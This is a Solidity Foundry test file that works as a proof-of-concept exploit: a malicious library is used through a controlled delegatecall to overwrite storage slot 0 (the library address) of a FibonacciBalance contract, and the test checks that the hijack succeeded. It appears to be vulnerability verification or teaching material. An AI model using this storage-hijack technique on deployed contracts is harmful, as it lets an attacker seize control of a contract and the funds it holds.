// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/FibonacciBalance.sol";

contract MaliciousLib {
    address public maliciousOwner;

    // This function will execute in FibonacciBalance's storage context
    function hijackStorage() public {
        // Access storage slot 0 (fibonacciLibrary address)
        assembly {
            sstore(0, address())
        }
    }
}

contract FibonacciBalanceTest is Test {
    FibonacciBalance fib;
    MaliciousLib maliciousLib;
    address user = makeAddr("user");
    
    function setUp() public {
        // Deploy malicious library
        maliciousLib = new MaliciousLib();
        
        // Deploy FibonacciBalance with the malicious library
        fib = new FibonacciBalance{value: 1 ether}(address(maliciousLib));
    }

    function testControlledDelegatecall() public {
        console2.log("--- BEFORE-Trigger State ---");
        address libBefore = fib.fibonacciLibrary();
        console2.log("Initial fibonacciLibrary address:", libBefore);

        console2.log("--- Trigger Attack ---");
        vm.prank(user);
        // Prepare call data to trigger malicious function
        bytes memory payload = abi.encodeWithSignature("hijackStorage()");
        
        // Execute controlled delegatecall via fallback
        (bool success, ) = address(fib).call(payload);
        require(success, "Delegatecall failed");

        console2.log("--- AFTER-Trigger State ---");
        address libAfter = fib.fibonacciLibrary();
        console2.log("Post-attack fibonacciLibrary address:", libAfter);

        console2.log("--- Vulnerability Verification ---");
        bool vulnerabilityExists = false;
        string memory reason;

        if (libAfter == libBefore) {
            reason = "fibonacciLibrary state variable unchanged";
        } else if (libAfter == address(fib)) {
            vulnerabilityExists = true;
            reason = "fibonacciLibrary state variable overwritten to attacker's control";
        } else {
            reason = "fibonacciLibrary changed but not to contract address";
        }

        // Print final verdict
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists:", reason);
        } else {
            console2.log("Vulnerability not Exist:", reason);
        }

        // Original storage check remains for completeness
        bytes32 slot0 = vm.load(address(fib), bytes32(uint256(0)));
        address newLib = address(uint160(uint256(slot0)));
        assertEq(
            newLib, address(fib),
            "Storage hijack failed - fibonacciLibrary not overwritten"
        );
    }
}